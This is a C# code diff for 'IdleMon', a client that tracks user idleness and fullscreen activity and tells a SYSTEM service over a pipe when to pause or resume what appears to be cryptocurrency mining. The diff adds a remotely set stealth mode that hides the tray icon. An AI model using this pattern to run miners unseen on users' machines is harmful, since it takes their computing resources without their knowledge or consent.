@@ -24,7 +24,11 @@ namespace IdleMon
             Idle,
             Pause,
             Resume,
-            Stop
+            Stop,
+            Stealth,
+            Log,
+            Fullscreen,
+            IdleTime
         }
 
         //Where the actual program starts
@@ -47,18 +51,8 @@ namespace IdleMon
 
         public IdleMonContext()
         {
-            InitializeComponent();
-
-            if (!Program.stealthMode)
-            {
-                
-                Application.ApplicationExit += new EventHandler(this.OnApplicationExit);
-                TrayIcon.Visible = true;
-                Utilities.Log("TrayIcon initialized.");
-
-                //TrayIcon.ShowBalloonTip(3000);
-            }
-
+            //InitializeComponent();
+            
             timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
             fullscreenTimer.Elapsed += new ElapsedEventHandler(OnFullscreenTimer);
 
@@ -117,7 +111,7 @@ namespace IdleMon
             
             // TrayIconContextMenu
             this.TrayIconContextMenu.Items.AddRange(new ToolStripItem[] {
-                    this.CloseMenuItem, this.PauseMenuItem});
+            this.CloseMenuItem, this.PauseMenuItem});
             this.TrayIconContextMenu.Name = "TrayIconContextMenu";
             this.TrayIconContextMenu.Size = new Size(153, 70);
             
@@ -235,6 +229,7 @@ namespace IdleMon
 
             if (!miningPaused && fullscreenDetected)
             {
+                
                 SendPipeMessage(PacketID.Pause, _isIdle, Environment.UserName);
                 sentFirstTime = false;
             }
@@ -271,6 +266,56 @@ namespace IdleMon
                 case ((int)PacketID.Resume):
                     Utilities.Log("Resume received from SYSTEM.");
                     PauseMining(false);
+                    break;
+
+                case ((int)PacketID.IdleTime):
+                    Utilities.Log("IdleTime received from SYSTEM.");
+                    
+                     int minutes = Int32.Parse(message.data);
+
+                    if (minutes < 0 || minutes > 3600)
+                    {
+                        Utilities.minutesIdle = 10;
+                    } else
+                    {
+                        Utilities.minutesIdle = minutes;
+                    }
+                    break;
+
+                case ((int)PacketID.Stealth):
+                    Utilities.Log("Stealth received from SYSTEM.");
+
+                    Program.stealthMode = message.isIdle;
+                    
+                    if (message.isIdle)
+                    {
+                        InitializeComponent();
+                        TrayIcon.Visible = !message.isIdle;
+                        Application.ApplicationExit += new EventHandler(this.OnApplicationExit);
+                        Utilities.Log("Stealth initialized.");
+                    }
+                    
+                    break;
+
+                case ((int)PacketID.Log):
+                    Utilities.Log("Log received from SYSTEM.");
+
+                    if (message.isIdle)
+                    {
+                        Program.enableLogging = message.isIdle;
+                        Utilities.Log("Logging initialized.");
+                    }
+                    break;
+
+                case ((int)PacketID.Fullscreen):
+                    Utilities.Log("Fullscreen received from SYSTEM.");
+
+                    if (message.isIdle)
+                    {
+                        monitorFullscreen = message.isIdle;
+                        fullscreenTimer.Start();
+                        Utilities.Log("Fullscreen monitoring initialized.");
+                    }
                     break;
 
                 case ((int)PacketID.Hello):
@@ -311,7 +356,7 @@ namespace IdleMon
         {
             Utilities.Log(string.Format("idleMon Client {0} is now connected!", connection.Id));
             timer.Start();
-            fullscreenTimer.Start();
+            if (monitorFullscreen) fullscreenTimer.Start();
             connectedToService = true;
 
             SendPipeMessage(PacketID.Hello, Utilities.IsIdle(), Environment.UserName, PacketID.None);
